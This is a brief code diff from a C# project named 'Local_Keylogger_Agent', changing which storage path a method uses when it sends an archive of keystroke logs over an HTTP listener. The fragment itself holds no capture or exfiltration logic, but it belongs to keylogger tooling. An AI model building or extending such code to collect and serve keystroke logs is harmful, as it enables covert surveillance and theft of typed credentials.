@@ -61,7 +61,7 @@ namespace Local_Keylogger_Agent
 
         private async Task SendLogsArchiveAsync(HttpListenerResponse response)
         {
-            string folderpPath = Storage.BaseKeylogFilePath;
+            string folderpPath = Storage.BaseKeylogLogsFilePath;
 
             if(!Directory.Exists(folderpPath))
             {
